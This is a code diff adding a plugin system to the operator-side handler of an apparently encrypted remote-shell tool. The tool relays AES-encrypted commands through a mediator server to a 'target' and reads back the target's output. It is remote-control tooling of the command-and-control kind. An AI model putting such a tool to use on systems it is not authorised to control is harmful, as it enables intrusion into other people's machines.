@@ -9,6 +9,7 @@ import argparse
 from Crypto.Cipher import AES
 from Crypto.Cipher import PKCS1_OAEP
 from Crypto.PublicKey import RSA
+import plugins
 from socket import *
 import sys
 import threading
@@ -21,11 +22,33 @@ class Handler:
         self.shell.setsockopt(IPPROTO_TCP, TCP_NODELAY, 1)
         self.stopReceiving = False
         self.lastCommand = ""
+        self.plugins = self.loadPlugins()
         if not mediatorHost:
             raise(ValueError("Hostname of mediator server not specified."))
         self.connect(mediatorHost)
         self.privKey, self.pubKey = self.getRSA()
         self.cipherKey = self.keyExchange()
+
+    def loadPlugins(self):
+        commandClasses = inspect.getmembers(plugins, inspect.isclass)
+        commandClasses.pop(0)
+        externalCommands = dict()
+        for className, commandObject in commandClasses:
+                externalCommands[str(commandObject)] = commandObject.handler
+        return externalCommands
+
+    def tryPlugin(self, commandLine):
+        argv = commandLine.split()
+        if not argv:
+            # newline sent -- not a plugin
+            return
+        command = argv[0]
+        try:
+            self.plugins[command](argv)
+        except KeyError:
+            # command not in plugins
+            pass
+        return
 
     def sendCommands(self):
         command = ""
@@ -33,15 +56,21 @@ class Handler:
             ch = sys.stdin.read(1)
             command += ch
             if command[-1] == "\n":
+                # send command to target
                 cipher = AES.new(self.cipherKey, AES.MODE_EAX)
                 nonce = cipher.nonce
                 ciphertext, tag = cipher.encrypt_and_digest(command.encode())
                 self.shell.send(nonce)
                 self.shell.send(tag)
                 self.shell.send(ciphertext)
+                # check if command was a plugin -- if so, run plugin's handler code
+                self.tryPlugin(command)
+                # record last command to not reprint from target's stdout
                 self.lastCommand = command
+                # close process if shell was exited
                 if command == "exit\n":
                     break
+                # reset input for next command
                 command = ""
 
     def readResponses(self):
